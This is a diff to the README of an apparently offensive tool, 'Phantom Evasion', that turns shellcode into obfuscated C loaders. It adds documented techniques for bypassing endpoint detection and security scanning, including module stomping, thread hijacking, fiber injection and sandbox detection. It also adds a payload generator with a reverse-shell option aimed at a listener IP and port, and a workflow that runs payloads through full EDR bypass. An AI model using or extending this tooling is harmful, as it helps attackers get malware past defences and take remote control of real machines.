@@ -45,6 +45,7 @@
 | `junk_code` | Random valid C blocks to inflate entropy and confuse signatures |
 | `polymorphic` | Randomised variable/function names per build |
 | `control_flow_flatten` | Switch-case state-machine dispatcher pattern |
+| `string_encrypt_stack` | Stack string construction — builds API names char-by-char at runtime |
 
 ### Layer 2 – EDR Bypass
 | Technique | Description |
@@ -54,6 +55,7 @@
 | `unhook_ntdll` | Restore ntdll .text from clean on-disk copy |
 | `api_hashing` | Resolve APIs by ROR-13 hash via PEB walking (no IAT entries) |
 | `hells_gate` | Dynamic SSN resolution + Halo's Gate hooked-stub fallback |
+| `module_stomping` | Overwrite signed DLL (.text section) with shellcode; execute from legitimate module address space |
 
 ### Layer 3 – ETW/AMSI Bypass
 | Technique | Description |
@@ -68,8 +70,11 @@
 | `apc` | QueueUserAPC injection into alertable thread |
 | `early_bird` | APC into suspended process before entry-point execution |
 | `callback` | Shellcode via Win32 enumeration callbacks (EnumDesktopWindows, etc.) |
+| `thread_hijack` | Suspend thread, redirect RIP to shellcode, resume — no new thread created |
+| `fiber_injection` | ConvertThreadToFiber + CreateFiber + SwitchToFiber — avoids CreateThread telemetry |
 | `sleep_encrypt` | XOR-encrypt in-memory shellcode during sleep (Ekko-style) |
 | `env_checks` | VM/sandbox/debugger detection (RDTSC, CPU count, RAM, disk, processes) |
+| `resource_check` | Resource-based sandbox detection (CPU cores, RAM, disk, screen res, process count, idle time) |
 | `parent_spoof` | PPID spoofing via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` |
 | `delayed_exec` | CPU-burn delay + business-hours + user-activity gating |
 | `process_masquerade` | PEB `ImagePathName`/`CommandLine` overwrite |
@@ -126,6 +131,52 @@ Install MinGW cross-compiler (Linux):
 ```bash
 sudo apt-get install mingw-w64
 ```
+
+---
+
+## Test Shellcode Generator
+
+Don't have Metasploit / msfvenom?  Use the built-in test shellcode generator to
+create safe payloads for exercising the obfuscation pipeline.
+
+```bash
+# Windows x64 MessageBoxA (pops a dialog — safe, no network)
+python tools/generate_test_shellcode.py --type messagebox
+
+# Windows x64 WinExec("calc.exe") — opens Calculator
+python tools/generate_test_shellcode.py --type calc --output output/test_payloads/calc.bin
+
+# NOP-sled + INT3 breakpoint (custom size)
+python tools/generate_test_shellcode.py --type nop --size 512
+
+# TCP reverse-shell stub (template with embedded IP/port)
+python tools/generate_test_shellcode.py --type reverse_shell \
+    --lhost 192.168.1.100 --lport 4444 --output shell.bin
+```
+
+### End-to-end test workflow
+
+```bash
+# 1. Generate a test payload
+python tools/generate_test_shellcode.py --type calc --output output/test_payloads/calc.bin
+
+# 2. Obfuscate with Phantom Evasion
+python main.py -i output/test_payloads/calc.bin -o output/stealth \
+    --encryption aes --edr-bypass full
+
+# 3. Inspect the generated C source
+cat output/stealth.c
+```
+
+### Generator options
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `--type` | required | `messagebox` \| `calc` \| `nop` \| `reverse_shell` |
+| `--output` | `output/test_payloads/<type>.bin` | Output `.bin` file path |
+| `--size` | `512` | NOP-sled size in bytes (`--type nop` only) |
+| `--lhost` | — | Listener IP (`--type reverse_shell`) |
+| `--lport` | `4444` | Listener port (`--type reverse_shell`) |
 
 ---
 
